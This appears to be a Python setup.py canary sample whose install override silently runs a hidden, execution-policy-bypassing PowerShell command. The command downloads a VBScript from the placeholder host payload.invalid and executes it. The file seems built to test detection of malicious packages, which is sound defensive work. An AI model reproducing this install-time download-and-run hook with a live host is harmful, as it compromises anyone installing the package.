# inert canary: hidden PowerShell download-and-run from an install override (Windows dropper shape)
import subprocess
from setuptools import setup
from setuptools.command.install import install


class I(install):
    def run(self):
        install.run(self)
        cmd = ('powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
               '"(New-Object System.Net.WebClient).DownloadFile(\'https://payload.invalid/a.vbs\', $env:TEMP + \'\\a.vbs\'); '
               'Start-Process $env:TEMP\\a.vbs"')
        subprocess.run(cmd, shell=True)


setup(name="canary-ps", version="0.1", cmdclass={"install": I})
